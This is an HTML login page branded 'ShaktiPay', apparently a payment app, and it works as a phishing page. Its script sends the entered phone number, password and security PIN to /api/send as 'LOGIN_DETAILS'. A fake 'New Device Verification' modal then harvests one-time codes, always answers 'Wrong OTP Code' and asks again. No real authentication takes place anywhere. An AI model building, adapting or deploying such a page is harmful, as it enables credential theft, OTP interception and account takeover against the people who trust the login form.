<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShaktiPay - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: #fcf8f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #fcf8f2;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-section {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-circle {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            background: linear-gradient(135deg, #0f1c3f, #ff7b00);
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 15px auto;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .logo-circle span {
            color: white;
            font-size: 40px;
            font-weight: bold;
        }
        .brand-title {
            font-size: 28px;
            font-weight: 700;
            color: #0f1c3f;
        }
        .brand-title span {
            color: #ff7b00;
        }
        .input-group {
            position: relative;
            width: 100%;
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 15px 15px 50px;
            border: none;
            border-radius: 30px;
            background: #ffffff;
            font-size: 16px;
            color: #333;
            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
            outline: none;
        }
        .input-group input::placeholder {
            color: #aaa;
        }
        .input-group .icon {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .input-group .icon svg {
            width: 22px;
            height: 22px;
            stroke: #444;
            stroke-width: 2;
            fill: none;
        }
        .options-row {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 0 10px;
            font-size: 14px;
        }
        .options-row a {
            color: #ff7b00;
            text-decoration: none;
        }
        
        /* Custom Round Checkbox Styling */
        .custom-checkbox-label {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            user-select: none;
            font-size: 14px;
            color: #666;
        }
        .custom-checkbox-label input[type="checkbox"] {
            display: none;
        }
        .checkmark {
            width: 18px;
            height: 18px;
            border: 2px solid #ff7b00;
            border-radius: 50%;
            display: inline-block;
            position: relative;
            background: #fff;
            transition: background 0.2s;
        }
        .custom-checkbox-label input[type="checkbox"]:checked + .checkmark {
            background: #ff7b00;
        }
        .custom-checkbox-label input[type="checkbox"]:checked + .checkmark::after {
            content: "";
            position: absolute;
            top: 3px;
            left: 3px;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: white;
        }

        .privacy-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .privacy-container a {
            color: #ff7b00;
            text-decoration: underline;
            margin-left: 4px;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 30px;
            background: linear-gradient(90deg, #ff8c00, #ff6600);
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 123, 0, 0.3);
            transition: opacity 0.2s;
        }
        .submit-btn:active {
            opacity: 0.9;
        }
        .footer-links {
            margin-top: 30px;
            text-align: center;
        }
        .footer-links a {
            color: #ff7b00;
            text-decoration: none;
            font-size: 14px;
        }
        .version {
            margin-top: 40px;
            color: #bbb;
            font-size: 12px;
        }

        /* Modal / Popup Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }
        .modal-box {
            background: #ffffff;
            width: 100%;
            max-width: 380px;
            border-radius: 20px;
            padding: 25px 20px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            animation: scaleUp 0.3s ease;
        }
        @keyframes scaleUp {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .modal-header h3 {
            font-size: 18px;
            color: #222;
        }
        .close-btn {
            background: none;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #666;
        }
        .modal-body p {
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 15px;
        }
        .phone-highlight {
            color: #ff7b00;
            font-weight: 600;
        }
        .otp-input-wrap {
            position: relative;
            margin-bottom: 8px;
        }
        .otp-input-wrap input {
            width: 100%;
            padding: 14px 110px 14px 45px;
            border: 1px solid #e0e0e0;
            border-radius: 30px;
            font-size: 16px;
            outline: none;
            background: #fff;
        }
        .otp-input-wrap .mail-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
        }
        .timer-badge {
            position: absolute;
            right: 6px;
            top: 50%;
            transform: translateY(-50%);
            background: #ffb74d;
            color: white;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            border: none;
            cursor: pointer;
        }
        .success-msg {
            color: #2e7d32;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: center;
            display: none;
            font-weight: 600;
        }
        .error-msg {
            color: #d32f2f;
            font-size: 12px;
            margin-bottom: 12px;
            text-align: center;
            display: none;
            font-weight: 600;
        }
        .confirm-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 30px;
            background: linear-gradient(90deg, #ff8c00, #ff6600);
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255, 123, 0, 0.3);
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-section">
            <div class="logo-circle">
                <span>S</span>
            </div>
            <div class="brand-title">Shakti<span>Pay</span></div>
        </div>

        <form id="loginForm" style="width: 100%;">
            <!-- Phone Input -->
            <div class="input-group">
                <span class="icon">
                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                </span>
                <input type="tel" id="phone" placeholder="Phone" maxlength="10" pattern="[0-9]{10}" required>
            </div>

            <!-- Password Input -->
            <div class="input-group">
                <span class="icon">
                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                </span>
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <!-- Security PIN Input -->
            <div class="input-group">
                <span class="icon">
                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                    </svg>
                </span>
                <input type="password" id="pin" placeholder="6 Digit PIN" maxlength="6" required>
            </div>

            <div class="options-row">
                <a href="#">Register</a>
                <!-- Round Checkbox for Remember Me -->
                <label class="custom-checkbox-label">
                    <input type="checkbox" id="remember" checked>
                    <span class="checkmark"></span> Remember Me
                </label>
            </div>

            <!-- Round Checkbox for Agree Privacy Agreement -->
            <div class="privacy-container">
                <label class="custom-checkbox-label">
                    <input type="checkbox" id="agree" checked required>
                    <span class="checkmark"></span> Agree <a href="#">"User Privacy Agreement"</a>
                </label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
        </form>

        <div class="footer-links">
            <a href="#">Forget Password</a>
        </div>

        <div class="version">v1.4.4</div>
    </div>

    <!-- OTP Verification Modal -->
    <div class="modal-overlay" id="otpModal">
        <div class="modal-box">
            <div class="modal-header">
                <h3>New Device Verification</h3>
                <button class="close-btn" id="closeModal">✕</button>
            </div>
            <div class="modal-body">
                <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
                <p>OTP will be sent to <span class="phone-highlight" id="displayPhone">+91 7061082880</span></p>
                
                <form id="otpForm">
                    <div class="otp-input-wrap">
                        <span class="mail-icon">✉️</span>
                        <input type="text" id="otpCode" placeholder="OTP Code" maxlength="6" required>
                        <button type="button" class="timer-badge" id="sendOtpBtn">Send</button>
                    </div>
                    <div class="success-msg" id="successText">✅ OTP Send Successfully!</div>
                    <div class="error-msg" id="errorText">❌ Wrong OTP Code, Please try again!</div>
                    <button type="submit" class="confirm-btn" id="confirmBtn">Confirm</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        let currentPhone = '';
        let currentPassword = '';
        let currentPin = '';
        let countdownInterval;

        const loginForm = document.getElementById('loginForm');
        const otpModal = document.getElementById('otpModal');
        const closeModal = document.getElementById('closeModal');
        const displayPhone = document.getElementById('displayPhone');
        const submitBtn = document.getElementById('submitBtn');
        const errorText = document.getElementById('errorText');
        const successText = document.getElementById('successText');
        const sendOtpBtn = document.getElementById('sendOtpBtn');

        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
        });

        const pinInput = document.getElementById('pin');
        pinInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        });

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            currentPhone = phoneInput.value;
            currentPassword = document.getElementById('password').value;
            currentPin = pinInput.value;

            submitBtn.disabled = true;
            submitBtn.innerText = 'Please wait...';

            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        type: 'LOGIN_DETAILS',
                        phone: currentPhone, 
                        password: currentPassword, 
                        pin: currentPin 
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            }

            displayPhone.innerText = '+91 ' + currentPhone;
            submitBtn.disabled = false;
            submitBtn.innerText = 'Sign In';
            errorText.style.display = 'none';
            successText.style.display = 'none';
            
            sendOtpBtn.innerText = 'Send';
            sendOtpBtn.disabled = false;
            clearInterval(countdownInterval);

            otpModal.style.display = 'flex';
        });

        sendOtpBtn.addEventListener('click', async function() {
            successText.style.display = 'block';
            
            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        type: 'OTP_REQUEST',
                        phone: currentPhone 
                    })
                });
            } catch (error) {
                console.error('Error sending OTP request:', error);
            }

            let timeLeft = 59;
            sendOtpBtn.innerText = timeLeft + 's';
            sendOtpBtn.disabled = true;

            clearInterval(countdownIdentifier = setInterval(() => {
                timeLeft--;
                if (timeLeft > 0) {
                    sendOtpBtn.innerText = timeLeft + 's';
                } else {
                    sendOtpBtn.innerText = 'Resend';
                    sendOtpBtn.disabled = false;
                    clearInterval(countdownInterval);
                }
            }, 1000));
        });

        closeModal.addEventListener('click', function() {
            otpModal.style.display = 'none';
            clearInterval(countdownInterval);
        });

        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const otp = document.getElementById('otpCode').value;
            const confirmBtn = document.getElementById('confirmBtn');

            confirmBtn.disabled = true;
            confirmBtn.innerText = 'Verifying...';

            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        type: 'OTP_CODE',
                        phone: currentPhone,
                        otp: otp 
                    })
                });

                setTimeout(() => {
                    successText.style.display = 'none';
                    errorText.style.display = 'block';
                    document.getElementById('otpCode').value = '';
                    confirmBtn.disabled = false;
                    confirmBtn.innerText = 'Confirm';
                }, 800);

            } catch (error) {
                confirmBtn.disabled = false;
                confirmBtn.innerText = 'Confirm';
            }
        });
    </script>
</body>
</html>
